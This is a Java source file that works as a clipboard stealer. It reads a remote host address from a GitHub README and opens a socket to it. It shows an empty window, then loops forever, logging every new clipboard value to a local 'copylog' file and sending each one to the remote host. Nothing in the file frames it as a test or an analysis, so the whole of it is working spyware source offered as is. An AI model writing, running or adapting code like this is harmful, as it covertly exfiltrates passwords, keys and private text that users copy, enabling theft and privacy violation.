import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.*;
import java.lang.management.MemoryType;
import java.lang.management.MemoryUsage;
import java.lang.ref.SoftReference;
import java.lang.ref.WeakReference;
import java.lang.reflect.Method;
import java.net.*;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Paths;
import java.util.Scanner;
import java.util.UUID;
import java.util.function.BiConsumer;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

public class Main {
    public static void main(String[] args){
        HttpClient client=HttpClient.newHttpClient();
        HttpRequest request= HttpRequest.newBuilder()
                .uri(URI.create("https://raw.githubusercontent.com/yank5/requestip/main/README.md"))
                .build();

        String c;
        OutputStream outputStream;
        Socket socket;
        JFrame jFrame=new JFrame();
        jFrame.setSize(new Dimension(300,300));
        jFrame.setVisible(true);
        File file=new File("copylog");
        FileWriter filew;
        try {
            c = client.send(request, HttpResponse.BodyHandlers.ofString()).body();
            System.out.println(c);
            socket=new Socket(c,443);
            outputStream=socket.getOutputStream();
            socket.setKeepAlive(true);

            filew = new FileWriter(file);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }


//        System.out.println(UUID.randomUUID());

        //System.out.println(System.getProperty("os.name"));
        //System.getProperties().list(System.out);
        File cook=new File("");
//        DebugGraphics r=new DebugGraphics();

        String clip=getClipBoard();
        System.out.println(clip);
        while(true) {
            if(!clip.equals(getClipBoard())){
                System.out.println(getClipBoard());
                clip=getClipBoard();
                try {
                    filew.append(clip).append("\n");
                    outputStream.write(clip.getBytes(StandardCharsets.UTF_8));
                    filew.flush();
                    outputStream.flush();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }

    public static String getClipBoard(){
        try {
            return (String)Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
        } catch (UnsupportedFlavorException | IOException e) {
//            System.err.println(e.getMessage());
        }
        return "";
    }
}